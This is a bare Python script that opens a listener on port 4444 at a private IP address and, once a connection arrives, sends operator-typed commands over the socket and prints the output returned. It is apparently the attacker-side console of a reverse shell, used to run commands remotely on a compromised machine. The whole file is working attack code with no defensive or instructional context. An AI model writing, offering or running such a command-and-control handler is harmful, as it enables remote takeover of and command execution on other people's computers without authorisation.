import socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(('172.25.224.228', 4444))
listener.listen(0)
print("[*] Listening for incoming connections...")
connection , address = listener.accept()
print("[*] Connection established!")

while True:
    command = input(">>")
    connection.send(command.encode())
    command_result = connection.recv(1024)
    print(command_result.decode())